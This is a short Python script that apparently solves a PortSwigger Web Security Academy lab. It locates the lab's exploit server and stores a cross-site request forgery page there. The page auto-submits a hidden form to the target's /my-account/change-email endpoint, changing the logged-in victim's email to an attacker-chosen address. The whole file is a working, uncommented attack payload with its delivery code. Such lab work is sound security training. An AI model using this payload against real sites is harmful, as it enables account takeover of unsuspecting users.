
import requests
import sys
import bs4
from bs4 import BeautifulSoup

site = 'acef1f941eeb962dc09e4bab00b800f9.web-security-academy.net'


s = requests.Session()
url = f'https://{site}/login'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html=f'''
<html>
  <body>
        <form action="https://{site}/my-account/change-email" method="GET">
          <input type="hidden" name="email" value="pwned@evil-user.net">
        </form>
        <script>
          document.forms[0].submit();
        </script>
  </body>
</html>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)
print(resp)